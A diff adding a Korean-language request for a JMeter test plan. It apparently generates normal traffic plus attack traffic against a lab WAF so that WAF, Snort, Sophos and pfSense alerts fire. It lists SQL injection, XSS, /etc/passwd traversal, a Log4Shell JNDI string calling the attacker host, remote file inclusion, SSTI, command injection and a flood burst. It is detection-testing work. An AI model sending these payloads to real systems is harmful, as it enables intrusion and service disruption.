@@ -1,0 +1,123 @@
+Apache JMeter JMX 파일을 작성해줘.
+
+  ## 환경
+  - Target: http://192.168.40.5 (WAF, port 80)
+  - Host Header: www.kj.ac.kr
+  - JMeter 실행 위치: 192.168.88.10 (attacker_outer)
+
+  ---
+
+  ## Thread Group 1 — 정상 트래픽
+
+  - Threads: 5, Ramp-up: 30s, Loop: Forever
+  - Uniform Random Timer: 1000~2000ms
+
+  요청 목록 (Throughput Controller로 비율 조절):
+
+  ① GET /api/board/posts  (30%)
+  ② GET /api/board/posts/${__Random(1,20)}  (20%)
+  ③ POST /api/auth/login  (15%)
+     Content-Type: application/json
+     Body: {"email":"user@kj.ac.kr","password":"Password1!"}
+  ④ POST /api/board/posts  (15%)
+     Content-Type: application/json
+     Authorization: Bearer test-token
+     Body: {"title":"테스트 제목","content":"일반 게시글 내용입니다."}
+  ⑤ GET 랜덤 선택 (10%)
+     - /api/notfound
+     - /admin
+     - /test.php
+     (Random Controller로 3개 중 랜덤)
+  ⑥ POST /api/auth/login  (10%)
+     Content-Type: application/json
+     Body: {"email":"notexist@kj.ac.kr","password":"wrongpass"}
+
+  ---
+
+  ## Thread Group 2 — 저강도 공격 트래픽
+
+  - Threads: 1, Ramp-up: 10s, Loop: Forever
+  - Uniform Random Timer: 20000~30000ms
+  - Interleave Controller로 순환
+
+  ① POST /api/auth/login
+     Content-Type: application/json
+     Body: {"email":"' UNION SELECT 1,2,3--","password":"test"}
+     [WAF SQLi / Snort SQLi 탐지]
+
+  ② GET /api/board/posts?keyword=%27+OR+1%3D1--
+     [WAF SQLi 탐지]
+
+  ③ POST /api/board/posts
+     Content-Type: application/json
+     Body: {"title":"<script>alert('XSS')</script>","content":"내용"}
+     [WAF XSS / Snort XSS 탐지]
+
+  ④ GET /api/board/posts?file=../../../etc/passwd
+     [WAF LFI / Snort LFI 탐지]
+
+  ⑤ GET /api/board/posts
+     Header: X-Api-Version: ${jndi:ldap://192.168.88.10/a}
+     [WAF RCE / Snort Log4Shell 탐지]
+
+  ⑥ GET /api/board/posts?url=http://192.168.88.10/evil.php
+     [WAF RFI 탐지]
+
+  ⑦ GET /api/auth/login
+     Header: Cookie: JSESSIONID=abc123
+     Header: Cookie: JSESSIONID=hacked456
+     (쿠키를 2개 중복 설정)
+     [WAF Session Fixation 탐지]
+
+  ⑧ POST /api/board/posts
+     Content-Type: application/json
+     Body: {"content":"${7*7}","title":"SSTI test"}
+     [WAF 백엔드 주입(SSTI) 탐지]
+
+  ⑨ PUT /api/auth/login
+     Content-Type: application/json
+     Body: {"test":"data"}
+     [WAF 비정상 메서드/프로토콜 위반 탐지]
+
+  ⑩ GET /api/board/posts
+     User-Agent: sqlmap/1.0
+     [Snort 스캐너 탐지]
+
+  ⑪ GET /api/board/posts
+     User-Agent: Googlebot; exec(whoami)
+     [Snort CMDI 탐지]
+
+  ---
+
+  ## Thread Group 3 — 버스트 공격 (주기적)
+
+  Flow Control Action(Pause)으로 아래 순서 반복:
+  [10분 대기] → [버스트 A 30초] → [10분 대기] → [버스트 B] → [10분 대기] → [버스트 C] → 반복
+
+  ### 버스트 A — Flood (Sophos DoS + Snort Flood 트리거)
+  - Threads: 20, Ramp-up: 1s, Loop: 5, Think Time: 없음
+  - GET /api/board/posts
+    [Snort DoS/Flood: 1초 내 80건↑ / Sophos DoS: 5분 내 100건↑]
+
+  ### 버스트 B — 스캐너 반복 (Snort 스캐너 반복 트리거)
+  - Threads: 1, Loop: 10, Think Time: 5000ms
+  - GET /api/board/posts
+    User-Agent: nikto/2.1.6
+    [Snort 스캐너: 60초 내 5건↑]
+
+  ### 버스트 C — 비정상 포트 (pfSense ALL_DROP 트리거)
+  - Threads: 5, Loop: 5, Think Time: 없음
+  - Random Controller로 랜덤 선택:
+    - http://192.168.40.5:8443/test
+    - http://192.168.40.5:9090/admin
+    - http://192.168.40.5:3306/
+    [FW ALL_DROP: 5분 내 20건↑]
+    (연결 거부되어도 방화벽 차단 로그 생성됨)
+
+  ---
+
+  ## 추가 요구사항
+  - TG1과 TG2, TG3는 동시 실행 (병렬)
+  - TG3의 버스트 A/B/C는 Sequential하게 실행 (순서 유지)
+  - 결과는 .jmx 파일로 출력
+  - 모든 HTTP 요청에 Connection Keep-Alive 헤더 포함
